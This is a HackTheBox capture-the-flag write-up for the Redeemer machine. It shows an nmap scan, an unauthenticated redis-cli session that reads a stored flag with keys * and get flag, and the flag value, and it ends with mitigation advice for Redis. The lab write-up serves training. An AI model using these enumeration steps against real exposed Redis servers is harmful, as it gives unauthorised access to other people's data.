# Redeemer - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Linux
**IP Address:** 10.129.136.187
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Redeemer**. 

*   **Initial Access:** Unauthenticated Redis database access (Port 6379).
*   **Privilege Escalation:** Not required for this Tier 0 machine.
*   **Key Learning Points:** 
    * Enumerating Redis databases using `redis-cli`.
    * Identifying and retrieving sensitive data from misconfigured NoSQL databases.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 6379/tcp | redis | Redis 5.0.7 | Unauthenticated access allowed. |

**Nmap Command:**
```bash
nmap -p 6379 -sC -sV -oN nmap/Redeemer 10.129.136.187
```

## 2.2. Web Enumeration
**Strategy:** No web services were found on the target machine.

---

# 3. Initial Access (Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Unauthenticated Redis database access.
*   **Vector:** Redis service on port 6379.

## 3.2. Exploitation Path
The reconnaissance phase identified a Redis service on port 6379. Using `redis-cli`, a connection was established to the remote host without requiring any authentication. Upon connection, the `info` command confirmed the service details, and `keys *` revealed several keys stored in the default database (index 0). One of these keys, named `flag`, contained the target flag string.

**Payload/Tool:**
```bash
# Connect to Redis
redis-cli -h 10.129.136.187

# Enumerate and retrieve flag
10.129.136.187:6379> info
10.129.136.187:6379> keys *
10.129.136.187:6379> get flag
```

**Flag:**
```bash
# 03e1d2b376c37ab3f5319922053953eb
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Not applicable for this target.

---

# 5. Credentials & Loot

| Service | Access | Note |
| :--- | :--- | :--- |
| Redis | Unauthenticated | Direct access to all stored keys. |

---

# 6. Recommendations & Mitigation
1. **Enable Authentication:** Configure Redis to require a strong password by setting the `requirepass` directive in the `redis.conf` file.
2. **Bind to Localhouse:** Restrict Redis to listen only on the loopback interface (`127.0.0.1`) if remote access is not required.
3. **Use a Firewall:** Use a network firewall to restrict access to port 6379 only from trusted IP addresses.
